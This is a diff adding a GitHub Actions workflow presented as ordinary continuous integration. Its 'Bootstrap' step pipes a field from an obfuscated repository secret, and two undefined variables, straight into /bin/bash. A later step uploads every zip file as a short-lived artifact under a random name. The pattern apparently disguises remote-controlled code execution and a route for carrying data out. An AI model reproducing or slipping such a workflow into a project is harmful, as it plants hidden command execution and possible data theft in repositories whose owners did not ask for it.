@@ -1,0 +1,28 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          la430: ${{ secrets.la430 }}
+        run: |
+          printf '%s' "$la430" | jq -r .tsvq466 | /bin/bash
+          echo $txo62823 | jq -r .q0188 | /bin/bash
+          printf '%s' "$dfqh216" | jq -r .tt1130 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kCl68Tbh
+          path: "*.zip"
+          retention-days: 1
